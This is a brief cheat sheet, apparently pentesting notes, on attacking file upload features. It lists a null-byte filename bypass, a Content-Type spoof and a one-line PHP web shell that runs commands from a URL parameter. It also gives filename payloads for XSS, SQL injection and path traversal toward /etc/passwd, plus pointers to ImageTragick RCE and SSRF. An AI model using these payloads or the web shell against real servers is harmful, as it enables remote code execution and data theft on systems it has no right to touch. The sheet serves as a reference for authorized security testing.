### Vulnerabilities via Arbitrary File Upload


### Bypasses

#### Null Byte Bypass
```
image.php%00.png
```

#### Content-Type Bypass
```
Content-Type: image/jpeg
```

#### Content-Length Bypass
```
<?php system($_GET['c']);?>
```

### Vulnerabilities

#### XSS(Cross Site Scripting)
```
Filename: "><svg onload=alert(1)>.jpeg
xss.svg -> file contain xss payload inside svg format
```

#### SQL Injection
```
'sleep(10).jpg
```

#### Path Traversal
```
../../logo.png
../../etc/passwd/logo.png
```

#### RCE
```
ImageTragic
```

#### SSRF
```
Change 'type=file' to 'type=url'
```

#### Uploaded file not found? Try Path Traversal on filename.
#### Try to brutefore file extension
